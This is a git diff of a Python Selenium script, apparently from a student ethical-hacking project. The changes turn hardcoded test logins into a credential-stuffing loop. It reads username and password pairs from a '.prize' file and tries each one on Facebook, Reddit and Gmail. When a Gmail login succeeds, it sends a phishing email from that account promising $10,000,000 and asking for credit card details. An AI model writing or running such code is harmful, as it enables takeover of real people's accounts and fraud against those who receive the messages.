@@ -4,6 +4,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver import ChromeOptions
 import time
 import smtplib
+import sys
 
 
 def facebook(driver, username, password):
@@ -96,10 +97,8 @@ def reddit(driver, username, password):
 
 
 def sendMail(user, password, toaddr, subject, body):
-	usermail = user + "@gmail.com"
-
 	msg = "\r\n".join([
-	"From: " + user + "@gmail.com",
+	"From: " + user,
 	"To: " + toaddr,
 	"Subject: " + subject,
 	"",
@@ -109,43 +108,54 @@ def sendMail(user, password, toaddr, subject, body):
 	server = smtplib.SMTP("smtp.gmail.com:587")
 	server.ehlo()
 	server.starttls()
-	server.login(usermail,password)
-	server.sendmail(usermail, toaddr, msg)
+	server.login(user,password)
+	server.sendmail(user, toaddr, msg)
 	server.quit()
 
 
 
 def main():
 	# get the path of ChromeDriverServer
-	chrome_driver_path = "D:/chromedriver.exe"
+	# chrome_driver_path = "D:/chromedriver.exe"
+	sys.path.append("/Users/charlesgong/Desktop/ethical-hacking-project/hacker/selenium/chromedriver")
+	chrome_driver_path = "/Users/charlesgong/Desktop/ethical-hacking-project/hacker/selenium/chromedriver"
 
 	opts = ChromeOptions()
 	opts.add_experimental_option("detach", True)
 	# create a new Chrome session
 	driver = webdriver.Chrome(chrome_driver_path, chrome_options=opts)
 
+	with open('.prize', 'r') as f:
+		creds = []
 
-	#failed attempt example
-	attempt = facebook(driver, "myethicalproject@gmail.com", "easypasswordsfsf")
-	if attempt == False:
-		#successful attempt
-		facebook(driver, "myethicalproject@gmail.com", "easypasswor")
+		line = f.readline()
 
-	#failed attempt example
-	attempt = reddit(driver, "ethicalhackingprojec", "samplepassworsaldkfa")
-	if attempt == False:
-		#successful attempt
-		reddit(driver, "ethicalhackingprojec", "samplepasswor")
+		while line:
+			cred = line.strip().split(' ')
+			user = cred[0]
+			pswd = cred[1]
 
-	success = gmail(driver, "myethicalproject@gmail.com", "easypasswor")
+			creds.append(tuple([user, pswd]))
+			line = f.readline()
 
-	if success == True:
-		sendMail("myethicalproject", "easypasswor", "myethicalproject@gmail.com", "Subject line", "This is the body")
+		for u, p in creds:
+			if facebook(driver, u, p):
+				break
 
-	
+		for u, p in creds:
+			if reddit(driver, u, p):
+				break
+
+		for u, p in creds:
+			if gmail(driver, u, p):
+				sendMail(u, p,
+					"chlsgong@utexas.edu",
+					"You received $10,000,000!",
+					"Send credit card info."
+				)
+				break
+
+		f.close()
+
 if __name__ == '__main__':
 	main()
-
-
-
-
